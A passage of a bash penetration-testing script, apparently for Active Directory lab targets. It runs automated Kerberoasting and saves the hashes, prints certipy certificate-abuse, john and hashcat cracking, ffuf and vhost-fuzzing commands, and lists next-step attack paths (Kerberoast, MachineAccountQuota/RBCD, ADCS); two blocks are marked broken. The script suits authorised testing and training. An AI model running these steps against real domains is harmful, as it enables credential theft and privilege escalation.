                                 echo -e "        ${YELLOW}Privilege escalation via certificate enrollment / template control${RESET}"
                                 ;;
                            ESC13)
                                 echo -e "    ${RED}${esc}${RESET} →  ${RED}HIGH/CRITICAL${RESET}  (9/10)"
                                 echo -e "        Issuance policy can map the requester into a linked privileged group"
                                 echo -e "        Check for msDS-OIDToGroupLink / linked group abuse"
                                 ;;
                            ESC2|ESC3)
                                 echo -e "    ${YELLOW}${esc}${RESET} →  ${YELLOW}HIGH${RESET}      (8/10)"
                                 echo -e "        Certificate abuse with weak approval / client auth"
                                 ;;
                            ESC6|ESC8)
                                 echo -e "    ${YELLOW}${esc}${RESET} →  ${YELLOW}HIGH${RESET}      (8/10)"
                                 echo -e "        NTLM relay / authentication coercion attack"
                                 ;;
                            ESC5|ESC7)
                                 echo -e "    ${BLUE}${esc}${RESET}   →  ${BLUE}MEDIUM${RESET}    (6/10)"
                                 echo -e "        Requires additional permissions or attack chaining"
                                 ;;
                            *)
                                 echo -e "    ${esc}   →  UNKNOWN risk"
                                 ;;
                       esac
                    done
                else
                    warn "Vulnerability detected but ESC identifier could not be parsed"
                fi

                mapfile -t ADCS_TEMPLATES < <(
                    grep -iE 'Template Name|Template:' "$CERTIPY_FILE" \
                    | sed -E 's/.*(Template Name|Template):\s*//I' \
                    | sort -u
                )

                if [[ ${#ADCS_TEMPLATES[@]} -gt 0 ]]; then
                    success "Vulnerable certificate templates identified:"
                    for template in "${ADCS_TEMPLATES[@]}"; do
                        echo -e "    ${RED}- $template${RESET}"
                    done
                else
                    warn "Vulnerable templates detected but names could not be parsed"
                fi

                lightbulb "Next steps (manual exploitation):"
                if [[ "$CERTIPY_USED_KERB" == true ]]; then
                    note "Before Certipy Kerberos requests, make sure a local ccache exists:"
		    echo -e "        ${GREEN}sudo ntpdate -u dc1.ping.htb${RESET}"
		    echo -e "        ${GREEN}impacket-getTGT '${LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}' -dc-ip '${TARGET_IPV4}'${RESET}"
		    echo -e "        ${GREEN}export KRB5CCNAME=\"\$(pwd)/${AUTH_USER}.ccache\"${RESET}"
		    echo -e "        ${GREEN}klist${RESET}"
		    echo ""
                    echo -e "    ${GREEN}certipy-ad req -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -dc-host '${TARGET_IPV4}' -ca '${target_ca}' -template '<TEMPLATE>'${RESET}"
                else
                    echo -e "    ${GREEN}certipy-ad req -u '${ADCS_USER_UPN}' -p '$AUTH_PASS' -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -dc-host '${TARGET_IPV4}' -ca '${target_ca}' -template '<TEMPLATE>'${RESET}"
                fi
                echo -e "    ${GREEN}certipy-ad auth -pfx user.pfx -domain '${ADCS_DOMAIN}' -dc-ip '${TARGET_IPV4}'${RESET}"

            else
                success "No vulnerable certificate templates detected by Certipy"
                if [[ "$CERTIPY_USED_KERB" == true ]]; then
                    lightbulb "For ESC13/issuance-policy review, also inspect all enabled templates:"
                    echo -e "    ${GREEN}certipy-ad find -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -enabled -stdout -debug | grep -Ei 'ESC13|Issuance Policies|msDS-OIDToGroupLink|Linked Group|TemporaryWinRM|Enrollment Rights' -A 20 -B 10${RESET}"
                fi
            fi
        fi
    else
        warn "AD CS check skipped — certipy-ad not installed"
        lightbulb "Install with: pipx install certipy-ad"
    fi
elif [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == false ]]; then
    echo
    alert "${BLUE}Tip:${RESET} AD Certificate Services Detected"
    echo "  --------------------------------------"
    echo -e "    Re-run with ${BLUE}--check-certs${RESET} to review Certificate Templates (Check for Vulnerable Templates)"
    echo "    Example:"
    echo "      ./bash_simpleportscan.sh $TARGET --check-certs --user='username' --pass='password'"
elif [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$CREDS_PROVIDED" == false ]]; then
    warn "AD CS check skipped — Credentials are required."
elif [[ "$ENABLE_ADCS" == true && "$HAS_LDAP" -eq 0 ]]; then
    warn "AD CS check skipped — LDAP port not accessible"
    echo -e "   - Required ports: 389 (LDAP) or 636 (LDAPS) and 88 (Kerberos)"
fi

########################################
# Perform Attack: Kerberoast
########################################
if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -eq 1 ]]; then

    echo

    KERBEROAST_FILE="${LOOT_DIR:-.}/kerberoast_$(sanitize_name "$TARGET_IPV4")_$(date +%Y%m%d_%H%M%S).txt"

    alert "Kerberoast Candidates Identified"
    info  "Attempting Kerberoast via Impacket"
    lightbulb "Manual fallback:"
    echo -e "  ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}' -dc-ip $TARGET_IPV4 -request${RESET}"
    echo

    # Run Kerberoast safely and capture output
    KERB_EXIT=0
    KERB_OUTPUT=$(impacket-GetUserSPNs \
        "${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}" \
        -dc-ip "$TARGET_IPV4" \
        -request \
        -outputfile "$KERBEROAST_FILE" 2>&1) || KERB_EXIT=$?

    # Always show Impacket output
    echo "$KERB_OUTPUT"
    echo

    if parse_kerberoast_metadata "$KERBEROAST_FILE"; then
        parse_getuserspns_output "$KERB_OUTPUT" ||
            warn "Hashes were captured, but authoritative SPNs could not be parsed from GetUserSPNs output"
        success "Success! Kerberoast Hashes Captured!"
        info "Saved to: ${BYELLOW}$KERBEROAST_FILE${RESET}"
        record_loot "kerberoast_hashes" "${KERBEROAST_USER} ${SPN_NAME:-SPN-unresolved}" "$KERBEROAST_FILE"
        echo -e "    Crack with: "
        echo -e "        john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs $KERBEROAST_FILE"
        echo -e "            Or "
        echo -e "        hashcat -m 13100 $KERBEROAST_FILE /usr/share/wordlists/rockyou.txt --show"
        echo
    else
	    warn "Kerberoast Attempt Failed!"
        [[ "$KERB_EXIT" -ne 0 ]] && note "impacket-GetUserSPNs exited with status $KERB_EXIT"
        
        if echo "$KERB_OUTPUT" | grep -qi "KRB_AP_ERR_SKEW"; then
            lightbulb "Clock skew detected"
            echo -e "    Fix on Kali:"
            echo -e "        sudo ntpdate -u $TARGET_IPV4"
            echo -e "            Or"
            echo -e "        sudo timedatectl set-ntp true"
        fi

        if echo "$KERB_OUTPUT" | grep -qi "CCache file is not found"; then
            echo -e "    No Kerberos ticket cache found (normal if not using kinit)"
            echo -e "    Impacket will fall back to password auth automatically"
        fi

        if echo "$KERB_OUTPUT" | grep -qi "KDC_ERR"; then
            echo -e "    Kerberos error from DC — check credentials and domain"
            echo -e "    Verify domain format: DOMAIN/user:pass"
        fi
        echo
        warn "Kerberoast completed but no hashes were returned"
        echo -e  "    SPNs may exist but account may be protected or not Kerberoastable"
    fi
elif [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true ]]; then
    echo
    info "${RED}Kerberoast skipped${RESET} (Kerberos port 88 not accessible)"

elif [[ "$ENABLE_KERBROAST" == true ]]; then
    echo
    info "${RED}Kerberoast skipped${RESET} (credentials required)"
fi

# -------- Kerberos Reminder --------
if [[ $HAS_KERB -eq 1 && "$ENABLE_KERB_ENUM" == false ]]; then
    echo
    alert "${BLUE}Tip:${RESET} Kerberos detected"
    echo "  --------------------------------------"
    echo -e "    Re-run with ${BLUE}--kerb-enum${RESET} to attempt safe user enumeration"
    echo "    Example:"
    echo "      ./bash_simpleportscan.sh $TARGET_IPV4 --kerb-enum"
fi
# -------- Kerberoast Reminder --------
if [[ -s "$KERBEROAST_FILE" && $HAS_KERB -eq 1 && "$ENABLE_KERBROAST" == false ]]; then
    echo
    alert "${BLUE}Tip:${RESET} Kerberoast Potential Detected"
    echo "  --------------------------------------"
    echo -e "    Re-run with ${BLUE}--kerberoast${RESET} to attempt kerberoast attack via Impacket"
    echo "    Example:"
    echo "      ./bash_simpleportscan.sh $TARGET_IPV4 --kerberoast"
fi

# --------- Detect HTTP/HTTPS availability ----------
[ -s "$HTTP_MARKER" ] && HTTP_FOUND=true
[ -s "$HTTPS_MARKER" ] && HTTPS_FOUND=true
if [ -s "$HTTP_MARKER" ] || [ -s "$HTTPS_MARKER" ]; then
    HAS_WEB=1
    WEB_DETECTED=true
fi

# --------- Merge redirect hosts ----------
[ -s "$REDIRECT_HOSTS" ] && sort -u "$REDIRECT_HOSTS" >> "$DISCOVERED_HOSTS"

# -------- Run Fuff/Dirbuster (Web Directory Enumeration) ---------   
if [[ $HAS_WEB -eq 1 ]] && ! $ENABLE_WEB_ENUM; then
    echo
    alert "${BLUE}Tip:${RESET} Web Service Detected"
    info "    — add ${BLUE}--web-enum${RESET} to enable directory enumeration"
    echo
fi
 
for wl in \
    /usr/share/wordlists/dirb/common.txt \
    /usr/share/seclists/Discovery/Web-Content/common.txt; do
    if [ -f "$wl" ]; then
        WORDLIST="$wl"
        break
    fi
done

# Define common paths for the functions to use
COMMON_FUFF_PATHS=(
      admin login dashboard uploads upload files backup old test dev dashboard
      console install health status docs init setup logout index menu data v1 v2 v3
      api api/v1 api/v2 config db include static assets images js css service vendor
      settings panel manage management home portal support services storage swagger setting
      swagger-ui docs/swagger rest build rest staging roles permissions accounts group groups
    )
COMMON_VHOSTS=(admin api dev test staging internal)

# Define a regex for all ports we want to treat as "Web"
WEB_PORT_REGEX="^(80|443|8000|8008|8080|8443|8888|9000|9443)$"
if [[ "${#OPEN_PORTS[@]}" -gt 0 && $HAS_WEB -eq 1 ]]; then
    WEB_DETECTED=true
    for port in "${OPEN_PORTS[@]}"; do
        
        # Check if the current port in the array matches our web list
        if [[ "$port" =~ $WEB_PORT_REGEX ]]; then
            SCHEME=""

            # Assign scheme based on the port number
            case "$port" in
                80|8000|8008|8080|8888|9000) 
                    SCHEME="http" 
                    ;;
                443|8443|9443) 
                    SCHEME="https" 
                    ;;
            esac

            # If a scheme was assigned, proceed with fuzzing functions
            if [ -n "$SCHEME" ]; then
                WEB_DETECTED=true  # For the Recon Synopsis header
                
                # Call FFUF if enabled
                if $ENABLE_WEB_ENUM && command -v ffuf >/dev/null; then
                    run_ffuf_enum "$SCHEME" "$port" "$TARGET_IPV4"
                fi

                # Call VHOST Fuzzing if enabled
                if $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && command -v curl >/dev/null; then
                    run_vhost_fuzz "$SCHEME" "$port" "$TARGET_IPV4"
                fi
            fi
        fi
    done
fi

#if $ENABLE_WEB_ENUM && [[ $HAS_WEB -eq 1 ]] && command -v ffuf >/dev/null && [ -f "$WORDLIST" ]; then
# BROKEN CODE BLOCK | TODO FIX IT
if $ENABLE_WEB_ENUM && [[ $HAS_WEB -eq 2 ]] && command -v ffuf >/dev/null; then
    FFUF_OUT="ffuf_${TARGET}.json"
    
    echo
    info "Running directory enumeration with ffuf"

    # Prefer HTTPS if detected
    if [ -s "$HTTPS_MARKER" ]; then
        SCHEME="https"
        echo "    - SCHEME: HTTPS"
    else
        SCHEME="http"
        echo "    - SCHEME: HTTP"
    fi
    
    note "Target URL: $SCHEME://$TARGET_IPV4/FUZZ"
    echo "   ffuf -u $SCHEME://$TARGET_IPV4/FUZZ -w [wordlist] -mc 200,204,301,302,307,401,403 -fc 404 -t 50 -timeout 5 -o $FFUF_OUT -of json"
    note " Try with a Larger WordList ($WORDLIST)..."
        
    # ---- Run ffuf with inline wordlist ----
    FFUF_WORDLIST=$(mktemp)
    # Original paths
    printf "%s\n" "${COMMON_FUFF_PATHS[@]}" > "$FFUF_WORDLIST"
    # PHP variants
    printf "%s\n" "${COMMON_FUFF_PATHS[@]/%/.php}" > "$FFUF_WORDLIST"
    
    ffuf -u "$SCHEME://$TARGET_IPV4/FUZZ" -w $FFUF_WORDLIST \
        -mc 200,204,301,302,307,401,403 \
        -fc 404 \
        -t 50 \
        -timeout 5 \
        -o "$FFUF_OUT" \
        -of json

    # Wordlist is no longer needed.
    rm -f "$FFUF_WORDLIST"

    if [ -s "$FFUF_OUT" ]; then
        success "ffuf completed — results saved to $FFUF_OUT"
        # Extract interesting paths (jq required)
        if command -v jq >/dev/null; then
            jq -r '.results[].url' "$FFUF_OUT" \
            | sed "s|$SCHEME://$TARGET_IPV4||" \
            | sort -u \
            | while read -r path; do
                echo "    - $path"
            done
        else
            warn "jq not found — raw ffuf JSON output available"
        fi
    else
        warn "ffuf ran but produced no results"
    fi
    echo
fi

# --------- VHost Fuzzing ----------
# BROKEN CODE BLOCK | TODO FIX IT - VHOST FUzz Crashes
if $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && [ $HAS_WEB -eq 2 ] && command -v curl >/dev/null; then
    echo
    echo -e "${YELLOW}[i]${RESET} Running VHost fuzzing..."

    COMMON_VHOSTS=(admin api dev test staging beta internal portal dashboard)
    [ "$HTTP_FOUND" = true ] && BASE_HTTP_LEN=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://$TARGET_IPV4")
    [ "$HTTPS_FOUND" = true ] && BASE_HTTPS_LEN=$(curl -ks -o /dev/null -w "%{http_code}:%{size_download}" "https://$TARGET_IPV4")

    sort -u "$DISCOVERED_HOSTS" | grep -v '^$' | while read base; do
        echo -e "    [~] Fuzzing base domain: $base"
        for word in "${COMMON_VHOSTS[@]}"; do
            vhost="$word.$base"
            if [ "$HTTP_FOUND" = true ]; then
                len=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -H "Host: $vhost" "http://$TARGET_IPV4")
                [ "$len" != "$BASE_HTTP_LEN" ] && echo -e "${YELLOW}      [+] Possible HTTP VHost: $vhost${RESET}" && echo "$TARGET_IPV4 $vhost" >> "$HOSTS_FILE"
            fi
            if [ "$HTTPS_FOUND" = true ]; then
                len=$(curl -ks -o /dev/null -w "%{http_code}:%{size_download}" -H "Host: $vhost" "https://$TARGET")
                [ "$len" != "$BASE_HTTPS_LEN" ] && echo -e "${YELLOW}      [+] Possible HTTPS VHost: $vhost${RESET}" && echo "$TARGET $vhost" >> "$HOSTS_FILE"
            fi
        done
    done
elif $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && [ $HAS_WEB -eq 1 ]; then
    echo
    warn "Unable to VHOST FUZZ - 'curl' command is not available"
    echo
elif ! $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && [ $HAS_WEB -eq 1 ] && command -v curl >/dev/null; then
    echo
    alert "${BLUE}Tip:${RESET} Web Service detected and Hosts were discovered"
    info "    — add ${BLUE}--vhost${RESET} to enable vhost fuzzing"
    echo
    alert "${BLUE}Tip:${RESET} MANUAL Check"
    if [[ -n "$DNS_DOMAIN" ]]; then
        info "    — ${BLUE}python3 vhost_ffuf.py -i $TARGET_IPV4 -d $DNS_DOMAIN ${RESET}"
    else
        info "    — ${BLUE}python3 vhost_ffuf.py -i $TARGET_IPV4 -d 'target_host_domain'${RESET}"
    fi
fi

# ---------- /etc/hosts suggestions ----------
if [ -s "$HOSTS_FILE" ]; then

    # Load ALL existing hostnames from /etc/hosts (columns 2..N)
    mapfile -t EXISTING_DOMAINS < <(
        awk '$1 !~ /^#/ { for (i=2; i<=NF; i++) print $i }' /etc/hosts | sort -u
    )

    MISSING=false
    MISSING_LINES=()

    while read -r entry; do
        entry=$(echo "$entry" | xargs)
        IP=$(awk '{print $1}' <<< "$entry")
        DOMAIN=$(awk '{print $2}' <<< "$entry")

        if [[ ! " ${EXISTING_DOMAINS[*]} " =~ " $DOMAIN " ]]; then
            MISSING=true
            MISSING_LINES+=("echo '$IP $DOMAIN' | sudo tee -a /etc/hosts")
        fi
    done < <(sort -u "$HOSTS_FILE")

    # ONLY print anything if something is actually missing
    if $MISSING; then
        echo
        alert "${BLUE}Tip:${RESET} /etc/hosts suggestions:"
        echo "  ----------------------------"
        for line in "${MISSING_LINES[@]}"; do
            echo -e "    ${YELLOW}$line${RESET}"
        done
    fi
fi

# Attempt to run Bloodhound
if [[ $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 && $DC_AUTH_OK -eq 1 ]]; then
   if [[ "$ENABLE_BH_EXPORT" == "true" ]]; then
       gather_bloodhound
   else
      echo     
      alert "${BLUE}Tip:${RESET} LDAP, KERB, & DC Authorized Access detected"
      echo "  --------------------------------------"
      echo -e "    Re-run with ${BLUE}--run-blood${RESET} to enable auto bloodhound export"
      echo "    Example:"
      echo "      ./bash_simpleportscan.sh $TARGET --run-blood"
   fi
fi
# Attempt MSSQL Brute Force
if [[ "$HAS_MSSQL" == true && "$ENABLE_MSSQL_BRUTE" == false ]]; then
    echo
    alert "${BLUE}Tip:${RESET} MSSQL Service/Database detected"
    echo "  --------------------------------------"
    echo -e "    Re-run with ${BLUE}--mssql-brute${RESET} to attempt 'safe' user brute force"
    echo "    Example:"
    echo "      ./bash_simpleportscan.sh $TARGET_IPV4 --mssql-brute"
fi

# Initialize NTLM Detection
[ "$NTLM_ENABLED" = false ] && NTLM_DISABLED=true
[ "$NTLM_ENABLED" = true ] && NTLM_DISABLED=false

generate_synopsis() {
    echo -e "\n${BLUE}========================================${RESET}"
    echo -e "${BYELLOW}          RECON SYNOPSIS               ${RESET}"
    echo -e "${BLUE}========================================${RESET}"
    
    if [ -n "$AUTH_USER" ] && [ -n "$AUTH_PASS" ]; then
        echo -e "   - User:      ${YELLOW}$AUTH_USER${RESET}"
        echo -e "   - Password:  ${YELLOW}$AUTH_PASS${RESET}"
    fi
    if [ -n "$AUTH_DOMAIN" ] ; then
        echo -e "   - Domain:    ${YELLOW}$AUTH_DOMAIN${RESET}"
    fi
    
    success "Repeatable command artifact saved to: ${BYELLOW}$REPEATABLE_COMMANDS_FILE${RESET}"
    success "Attack path artifact saved to: ${BYELLOW}$ATTACK_PATH_REPORT${RESET}"
    success "Loot index saved to: ${BYELLOW}$LOOT_INDEX_FILE${RESET}"
    
    local found_any=false

    # Helper function to print item if true
    print_item() {
        local condition=$1
        local message=$2
        if [ "$condition" = true ]; then
            echo -e " [!] ${RED}${message}${RESET}"
            found_any=true
        fi
    }
    
    if [[ "$DNS_FOUND" == true ]]; then
        echo -e "\n ${CYAN}DNS SERVICE${RESET}"
        echo -e " --------------------------------------"
        info "DNS Summary"

        if [[ -n "$DNS_DOMAIN" ]]; then
            echo -e "    Domain: ${GREEN}$DNS_DOMAIN${RESET}"
        fi

        if [[ "$DNS_ENUM_DONE" == true ]]; then
            echo
            print_item "$DNS_ENUM_DONE" "DNS Enumeration Loot"
            echo -e "  Loot: ${GREEN}$DNS_LOOT_FILE${RESET}"
        fi
        
        if [[ "$DNS_ZONE_XFER_OK" == true ]]; then
            echo
            print_item "$DNS_ZONE_XFER_OK" "Zone transfer succeeded — review discovered hosts and add them to /etc/hosts"
    	    #high_risk "Zone transfer succeeded — review discovered hosts and add them to /etc/hosts"

    	    if [[ -n "${DNS_AXFR_FILE:-}" && -f "${DNS_AXFR_FILE:-}" ]]; then
                high_risk "AXFR output file: ${GREEN}${DNS_AXFR_FILE}${RESET}"

                echo
                info "AXFR preview:"
                sed -n '1,40p' "$DNS_AXFR_FILE"
            else
                warn "AXFR succeeded, but variable 'DNS_AXFR_FILE' was not found or not set!"
            fi
	fi

        lightbulb "Manual DNS commands:"
        echo -e "     ${GREEN}dig @$TARGET_IPV4 -x $TARGET_IPV4${RESET}"

        if [[ -n "$DNS_DOMAIN" ]]; then
            echo -e "     ${GREEN}dig axfr @$TARGET_IPV4 $DNS_DOMAIN${RESET}"
            echo -e "     ${GREEN}gobuster dns -d $DNS_DOMAIN -r $TARGET_IPV4 -w $DNS_WORDLIST${RESET}"
        else
            echo -e "     ${GREEN}dig @$TARGET_IPV4 ANY .${RESET}"
        fi
    fi

    # 1. Active Directory / Kerberos
    
    if [ "$NTLM_ENABLED" = true ] || [ "$LDAP_ANON_BIND" = true ] || [ "$LDAP_GUEST_BIND" = true ] || [ "$LDAP_AUTH_BIND" = true ] || [ "$ASREP_OK" = true ] || [ "$KERBEROS_AUTH_OK" = true ] || [ "$CAN_JOIN_COMPUTERS_TO_DOMAIN" = true ]; then
        echo -e "\n ${CYAN}ACTIVE DIRECTORY (AD) SERVICES${RESET}"
        echo -e " --------------------------------------"
        print_item "$NTLM_ENABLED" "NTLM is Enabled"
        print_item "$NTLM_DISABLED" "NTLM is Disabled. Use KERBEROS!"
        print_item "$KERBEROS_AUTH_OK" "Valid Kerberos Credentials ($AUTH_USER)"
        print_item "$LDAP_ANON_BIND" "Anonymous LDAP bind is possible (Information Disclosure)"
        print_item "$LDAP_GUEST_BIND" "LDAP Guest bind is possible (Information Disclosure)"
        print_item "$LDAP_AUTH_BIND" "Authenticated LDAP access confirmed"
        print_item "$ASREP_OK" "AS-REP Roasting is possible (User hashes obtainable)"
        print_item "$LAPS_READABLE" "LAPS Passwords are READABLE (High Risk / Local Admin)"
        print_item "$CAN_JOIN_COMPUTERS_TO_DOMAIN" "MachineAccountQuota Allows users to create up to ${MACHINE_ACCOUNT_QUOTA} computer accounts"
        if [[ -n "$BH_ZIP_FILE" ]]; then
            print_item "true" "BloodHound Data was gathered for: ${AUTH_DOMAIN:-$LDAP_DOMAIN}"
            echo -e "        File: ${YELLOW}${BH_ZIP_FILE}${RESET}"
        fi
    fi
    
    if [[ "$ADCS_VULNERABLE" == true ]]; then
        echo -e "\n ${CYAN}CERTIFICATE SERVICES (ADCS)${RESET}"
        echo -e " --------------------------------------"
        print_item "$ADCS_SERVICE_DETECTED" "AD CS Services Detected"
        print_item "$ADCS_VULNERABLE" "VULNERABLE ${#ADCS_TEMPLATES[@]} template(s)"
    fi
    
    # 2. Remote Management
    if [ "$WINRM_DETECTED" = true ] || [ "$SSH_DETECTED" = true ] || [ "$WMI_AUTH_OK" = true ] || [ "$PSEXEC_AUTH_OK" = true ] || [ "$RPC_ANON_OK" = true ] || [ "$RPC_GUEST_OK" = true ] || [ "$RPC_AUTH_OK" = true ]; then
        echo -e "\n ${CYAN}REMOTE MANAGEMENT SERVICES${RESET}"
        echo -e " --------------------------------------"
        print_item "$WINRM_DETECTED" "WinRM Service is Open and Access is Allowed (Possible Lateral Movement)"
        print_item "$WMI_AUTH_OK" "WMI is Open and Access is Allowed (Possible Lateral Movement)"
        print_item "$PSEXEC_AUTH_OK" "PSExec Access is Allowed (Possible Lateral Movement)"
        #print_item "$SSH_DETECTED" "SSH Service is Open (Check for password/key reuse)"
    
        print_item "$RPC_ANON_OK" "Anonymous RPC client access detected"
        print_item "$RPC_GUEST_OK" "Guest RPC client access detected"
        print_item "$RPC_AUTH_OK" "Authenticated RPC client access detected"
        print_item "$MSRPC_ANON_OK" "Anonymous MSRPC (rpcdump) access detected"
        if $RPC_ATTACK_MAP_FOUND; then
            print_item "$RPC_ATTACK_MAP_FOUND" "RPC-based attack paths identified:"
            cat "rpc_attackmap_${TARGET}.txt" | sed 's/^/   - /'
        fi
    fi

    # 3. File Services
    if [ "$SMB_V1" = true ] || [ "$SMB_V2" = true ] || [ "$SMB_V3" = true ] || [ "$FTP_ANON_OK" = true ] || [ "$SMB_GUEST_OK" = true ] || [ "$SMB_NULL_OK" = true ] || [ "$SMB_AUTH_OK" = true ]; then
        echo -e "\n ${CYAN}FILE SERVICES${RESET}"
        echo -e " --------------------------------------"
        print_item "$FTP_ANON_OK" "Anonymous FTP access is enabled"
        print_item "$SMB_V1" "SMB V1 is Supported"
        print_item "$SMB_V2" "SMB V2 is Supported"
        print_item "$SMB_V3" "SMB V3 is Supported"
        print_item "$SMB_SIGNING" "SMB Signing is Enforced"
        print_item "$SMB_GUEST_OK" "SMB Guest access is enabled"
        print_item "$SMB_NULL_OK" "SMB NULL Session is possible"
        print_item "$SMB_AUTH_OK" "Authenticated SMB access confirmed"
    fi
    
    # 4. Web Services
    if [ "$WEB_DETECTED" = true ]; then
        echo -e "\n ${CYAN}WEB SERVICES${RESET}"
        echo -e " --------------------------------------"
        print_item "$WEB_DETECTED" "Web Services Detected "
        print_item "$WEB_DETECTED" "  - Check for VHosts/Subdomains [vhost_ffuf.py]"
        print_item "$WEB_DETECTED" "  - Check for Local File Inclusion (LFI) abuse [lfi_tester.py]"
    fi
    
    # 5. Known Vulnerabilities / Misconfigurations
    local REDIS_DETECTED=false
    local DOCKER_DETECTED=false
    grep -qx "6379" "$OPEN_PORTS_FILE" 2>/dev/null && REDIS_DETECTED=true
    grep -qx "2375" "$OPEN_PORTS_FILE" 2>/dev/null && DOCKER_DETECTED=true

    if [ "$REDIS_DETECTED" = true ] || [ "$DOCKER_DETECTED" = true ]; then
        echo -e "\n ${CYAN}KNOWN VULNERABILITIES (CVEs/RCE)${RESET}"
        echo -e " --------------------------------------"
        print_item "$REDIS_DETECTED" "Unauthenticated Redis instance detected (RCE Risk)"
        print_item "$DOCKER_DETECTED" "Unauthenticated Docker API detected (Container Escape Risk)"
    fi

    if [ "$found_any" = false ]; then
        echo -e "\n ${GREEN}No high-risk immediate exposures identified.${RESET}"
    fi
    echo -e "\n${BLUE}========================================${RESET}\n"
}
# Generate the final summary
generate_synopsis

########################################
# Attack Path Decision Engine
########################################
attack_path_evaluation() {
    echo -e "\n${BLUE}========================================${RESET}"
    echo -e "${BYELLOW}    Attack Path Decision Engine        ${RESET}"
    echo -e "${BLUE}========================================${RESET}"
    #info "Evaluating LDAP-based attack paths"
    if [[ $HAS_SMB -eq 1 && $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 ]]; then
        echo -e "\n ${CYAN}ACTIVE DIRECTORY SERVICES${RESET}"
        echo -e " --------------------------------------"
    fi
    # ---------------------------------------------------------------------------
    # Domain-controller version context
    #
    # DC version information is supporting evidence. It is not treated as an
    # attack path unless another confirmed finding depends on that version.
    # ---------------------------------------------------------------------------
    if [[ "${DC_VERSION_FOUND:-false}" == true ]]; then
        echo
        info "Domain controller version context"

        if declare -p DC_DNS_HOSTNAMES >/dev/null 2>&1 && declare -p DC_OPERATING_SYSTEMS >/dev/null 2>&1 && declare -p DC_OPERATING_SYSTEM_VERSIONS >/dev/null 2>&1; then
            dc_count=${#DC_DNS_HOSTNAMES[@]}

            for ((i = 0; i < dc_count; i++)); do
                dc_name="${DC_DNS_HOSTNAMES[$i]:-Unknown}"
                os_name="${DC_OPERATING_SYSTEMS[$i]:-Unknown}"
                os_version="${DC_OPERATING_SYSTEM_VERSIONS[$i]:-Unknown}"
                build_number="${DC_BUILD_NUMBERS[$i]:-}"

                echo -e "  ${CYAN}DC:${RESET}      $dc_name"
                echo -e "  ${CYAN}OS:${RESET}      $os_name"
                echo -e "  ${CYAN}Version:${RESET} $os_version"

                if [[ -n "$build_number" ]]; then
                    echo -e "  ${CYAN}Build:${RESET}   $build_number"
                fi

                if [[ "${os_name,,}" == *"windows server 2025"* ]] || [[ "$build_number" == "26100" ]]; then
                    dc_2025=true
                fi
                echo
            done
         else
            dc_name="${DC_DNS_HOSTNAME:-Unknown}"
            os_name="${DC_OPERATING_SYSTEM:-Unknown}"
            os_version="${DC_OPERATING_SYSTEM_VERSION:-Unknown}"
            build_number="${DC_BUILD_NUMBER:-}"

            echo -e "  ${CYAN}DC:${RESET}      $dc_name"
            echo -e "  ${CYAN}OS:${RESET}      $os_name"
            echo -e "  ${CYAN}Version:${RESET} $os_version"

            if [[ -n "$build_number" ]]; then
                echo -e "  ${CYAN}Build:${RESET}   $build_number"
            fi

            if [[ "${os_name,,}" == *"windows server 2025"* ]] ||
                [[ "$build_number" == "26100" ]]; then
                dc_2025=true
            fi
        fi

        if [[ -n "${DC_VERSION_EVIDENCE:-}" ]]; then
            note "Evidence: ${DC_VERSION_EVIDENCE}"
        fi
    fi
    
    # 1. Kerberoasting (always valid if SPNs found)
    if [[ -v KERBEROAST_TARGETS && ${#KERBEROAST_TARGETS[@]} -gt 0 ]]; then
        ATTACK_PATHS+=("Kerberoasting")
        critical "Attack Path: Kerberoasting viable"
        lightbulb "Next Steps (Kerberoasting):"
        echo "   - Request service tickets (netexec ldap $TARGET_IPV4 -u $AUTH_USER -p '$AUTH_PASS' --kerberoasting output.txt / GetUserSPNs.py)"
        if [[ -n "$KERBEROAST_OUT" ]]; then
            echo "   - Or run John on Kerberoast Account Output: "
            echo "         john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs $KERBEROAST_OUT"
        fi
        echo "   - Crack hashes offline (hashcat mode 13100 / 19600)"
        echo "   - Re-test SMB / LDAP / WinRM with cracked credentials"
        echo "   - Check cracked account group membership (Domain Admins, Operators)"
        echo
    fi

    # 2. MAQ-based computer abuse
    if [[ "$LDAP_BIND_TYPE" == "auth" && "$MAQ_ENABLED" == true ]]; then
        ATTACK_PATHS+=("MachineAccountQuota Abuse")
        critical "Attack Path: MAQ abuse possible (computer account creation)"
        lightbulb "Next Step:"
        echo "   - Create a computer account (addcomputer.py / netexec)"
        echo "   - Set SPN on the new computer"
        echo "   - Kerberoast the computer account"
        echo "   - Check RBCD paths (BloodHound)"
        echo
    fi
    # 3. Vulnerable Cert Template
    if [[ "$ADCS_VULNERABLE" = true ]]; then
        ATTACK_PATHS+=("Exploitable Certificate Templates Detected (ADCS Abuse)")
        critical "Attack Path: ADCS Abuse"
        lightbulb "Next Steps:"
        echo "   - Enumerate vulnerable templates (certipy find ... -vulnerable -stdout / netexec ldap ... -M adcs -o action=list)"
        echo "   - Request authentication certificate as target user"
        echo "   - Authenticate using certificate (PKINIT / certipy auth)"
        echo "   - Dump NTLM hash or obtain TGT"
        echo "   - Re-test privileged access (SMB / LDAP / WinRM)"
        echo
    fi
    # 4. ASREP Roast
    if [[ "$ASREP_OK" = true ]]; then
